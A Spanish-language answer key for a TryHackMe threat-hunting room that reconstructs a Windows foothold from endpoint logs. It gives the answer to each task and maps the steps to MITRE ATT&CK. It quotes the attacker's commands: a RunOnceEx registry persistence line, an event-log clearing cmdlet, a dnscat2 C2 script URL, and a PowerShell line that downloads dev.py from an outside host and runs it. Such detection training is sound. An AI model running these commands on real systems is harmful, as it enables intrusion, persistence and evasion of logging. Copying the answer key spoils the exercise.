# Threat Hunting: Foothold

| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `threathuntingfoothold` |
| **Link** | [TryHackMe](https://tryhackme.com/room/threathuntingfoothold) |
| **Sección** | 02 Level Medium |
| **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | threat hunting / Windows logs / Sysmon / PowerShell / persistence / C2 / DNS tunneling |
| **Impacto** | Detectar y reconstruir un foothold (acceso inicial) en Windows a partir de logs de endpoint |

---

**Contexto:** Sala de threat hunting centrada en reconstruir el acceso inicial (foothold) en una máquina Windows a partir de logs (Sysmon/Security): procesos, reconocimiento, persistencia, cmdlets y herramientas de C2 (dnscat2) y entrega de segunda etapa.

## Solucionario

### Task 1: (Intro)

**Explicación:**

Introducción.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Intro) | `No answer needed` |

### Task 2: (Reconocimiento inicial)

**Explicación:**

Reconocimiento inicial: el timestamp del primer evento es `Jul 3, 2023 @ 14:14:09.000`; el archivo accedido/espiado es `config.php`; y la imagen del proceso implicado es `powershell.exe`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Timestamp) | `1. Jul 3, 2023 @ 14:14:09.000` |
| 2 | (File) | `2. config.php` |
| 3 | (Process) | `3. powershell.exe` |

### Task 3: (Descubrimiento)

**Explicación:**

Comandos de descubrimiento: `whoami /priv` (privilegios), `167.71.198.43` (IP C2/otros), `net users` (usuarios).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (whoami) | `1. whoami /priv` |
| 2 | (IP) | `2. 167.71.198.43` |
| 3 | (net users) | `3. net users` |

### Task 4: (Limpieza de logs)

**Explicación:**

Limpieza de logs: el ID de evento `428`; el comando `Clear-EventLog -LogName Security`; y el ID de evento `4240`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Event ID 1) | `1. 428` |
| 2 | (Clear command) | `2. Clear-EventLog -LogName Security` |
| 3 | (Event ID 2) | `3. 4240` |

### Task 5: (Persistencia)

**Explicación:**

Persistencia: la imagen del proceso es `powershell.exe` y la línea de comandos de creación de persistencia es `cmd /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \"C:\Windows\Temp\installer.exe\""`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Process) | `1. powershell.exe` |
| 2 | (Persistence command) | `2. cmd /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \"C:\Windows\Temp\installer.exe\""` |

### Task 6: (C2 y segunda etapa)

**Explicación:**

C2 y segunda etapa: la URL de dnscat2 es `https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1`; el comando para entregar la segunda etapa es `powershell iwr http://www.oneedirve.xyz/321c3cf/dev.py -outfile C:\Windows\Tasks\dev.py; python3 C:\Windows\Tasks\dev.py`; y el ejecutable malicioso es `update.exe`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (dnscat2 URL) | `1. https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1` |
| 2 | (Second stage command) | `2. powershell iwr http://www.oneedirve.xyz/321c3cf/dev.py -outfile C:\Windows\Tasks\dev.py; python3 C:\Windows\Tasks\dev.py` |
| 3 | (Malicious exe) | `3. update.exe` |

### Task 7: (Conclusión)

**Explicación:**

Conclusión.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Conclusión) | `No answer needed` |

---

**Metodología:**

1. Revisar los logs de endpoint para identificar el primer evento (timestamp), los archivos accedidos (`config.php`) y el proceso implicado (`powershell.exe`).
2. Correlacionar los comandos de descubrimiento ejecutados (`whoami /priv`, `net users`) y la IP con la que el atacante interactúa.
3. Detectar la limpieza de logs (`Clear-EventLog`) y la persistencia vía `RunOnceEx`.
4. Identificar la herramienta de C2 (dnscat2) y la segunda etapa (dnscat2.ps1, dev.py, update.exe).

**Learning chain:** config.php -> powershell.exe -> whoami /priv -> net users -> Clear-EventLog -> RunOnceEx installer.exe -> dnscat2.ps1 -> dev.py -> update.exe

**Lección:** *El foothold deja huellas en logs de endpoint (procesos, cmdlets, regedit y limpieza de logs); correlacionando estos artefactos se reconstruye el acceso inicial, la persistencia y el C2 (dnscat2).*

**MITRE ATT&CK:** T1012 (Query Registry) · T1059.001 (PowerShell) · T1070.001 (Clear Windows Event Logs) · T1547.001 (RunOnceEx) · T1071.004 (DNS C2) · T1105 (Ingress Tool Transfer)

**Fuente:** [TryHackMe - Threat Hunting: Foothold](https://tryhackme.com/room/threathuntingfoothold)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
